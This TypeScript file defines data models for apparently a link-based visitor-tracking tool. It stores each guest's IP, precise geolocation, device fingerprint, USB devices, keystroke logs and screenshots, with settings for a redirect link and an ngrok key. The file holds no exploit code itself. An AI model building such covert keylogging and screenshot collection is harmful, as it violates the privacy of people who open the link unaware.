import * as FS from 'fs'
import * as Path from 'path'
import { Model, Timestamps } from 'nedb-models'

import { BASE_DIR } from './constants'


export const storagePath = Path.join(BASE_DIR, 'collections')
if (!FS.existsSync(storagePath)) FS.mkdirSync(storagePath, {recursive: true})


export class Guest extends Model {
    ip:string
    sessionId:string
    os:string
    browser:string
    browserEngine:string
    cpuArch:string
    charging:boolean
    chargeLeft:string
    doNotTrack:string
    java:boolean
    flash:boolean
    language:string
    languages:string[]
    touch:boolean
    usbDevices:string[]
    resolution:string
    posts:Post[]
    logs:any[]
    screenshots:string[]
    keyLogs:KeyLog[]
    sessions:Sessions
    country:string
    countryCode:string
    regionName:string
    city:string
    zip:string
    lat:number
    lon:number
    timezone:string
    isp:string
    networkSpeed:NetworkSpeedObj

    async add(
        ip:string, os = '', browser = '', country = '', countryCode = '', regionName = '', city = '',
        zip = '', lat = 0, lon = 0, timezone = '', isp = '', browserEngine = '',
        cpuArch = '', posts = [], logs = [], screenshots = [], keyLogs = []
    ):Promise<Guest> {
        this.ip = ip
        this.country = country
        this.countryCode = countryCode
        this.regionName = regionName
        this.city = city
        this.zip = zip
        this.lat = lat
        this.lon = lon
        this.timezone = timezone
        this.isp = isp
        this.os = os
        this.browser = browser
        this.browserEngine = browserEngine
        this.cpuArch = cpuArch
        this.posts = posts
        this.logs = logs
        this.screenshots = screenshots
        this.keyLogs = keyLogs

        return await this.save()
    }

    static datastore() {
        return {filename: Path.join(storagePath, 'guests.db')}
    }
}


export class Setting extends Model {
    defaultLink:string
    timeout:number
    retries:number
    ngrokApiKey:string

    async add(defaultLink = 'http://google.com', timeout = 30, retries = 2, ngrokApiKey = ''):Promise<Setting> {
        this.defaultLink = defaultLink
        this.timeout = timeout
        this.retries = retries
        this.ngrokApiKey = ngrokApiKey

        return await this.save()
    }

    static datastore() {
        return {filename: Path.join(storagePath, 'settings.db')}
    }
}


Guest.use(Timestamps)
